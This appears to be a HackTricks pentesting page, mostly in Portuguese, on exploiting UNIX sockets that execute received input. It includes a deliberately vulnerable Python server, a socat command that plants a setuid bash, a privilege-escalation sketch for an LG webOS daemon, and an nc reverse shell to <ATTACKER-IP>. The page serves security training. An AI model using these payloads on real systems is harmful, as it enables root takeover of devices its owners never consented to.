# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Exemplo de socket binding com Python

No exemplo a seguir um **unix socket é criado** (`/tmp/socket_test.s`) e tudo que for **recebido** será **executado** por `os.system`. Sei que você não vai encontrar isso na natureza, mas o objetivo deste exemplo é ver como um código que usa unix sockets se parece, e como gerenciar a entrada no pior caso possível.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Execute** o código usando python: `python s.py` e **verifique como o socket está ouvindo**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Estudo de caso: escalada acionada por signal em UNIX socket de propriedade do root (LG webOS)

Alguns daemons privilegiados expõem um UNIX socket de propriedade do root que aceita entrada não confiável e vincula ações privilegiadas a thread-IDs e signals. Se o protocolo permitir que um cliente não privilegiado influencie qual native thread é alvo, você pode conseguir acionar um caminho de código privilegiado e escalar.

Observed pattern:
- Connect to a root-owned socket (e.g., /tmp/remotelogger).
- Create a thread and obtain its native thread id (TID).
- Send the TID (packed) plus padding as a request; receive an acknowledgement.
- Deliver a specific signal to that TID to trigger the privileged behaviour.

Minimal PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Para transformar isto em um root shell, pode ser usado um padrão simples de named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notas:
- Essa classe de bugs surge de confiar em valores derivados do estado de cliente não privilegiado (TIDs) e vinculá-los a manipuladores de sinal privilegiados ou à lógica privilegiada.
- Endureça aplicando verificação de credenciais no socket, validando formatos de mensagens e desacoplando operações privilegiadas de identificadores de thread fornecidos externamente.

## Referências

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
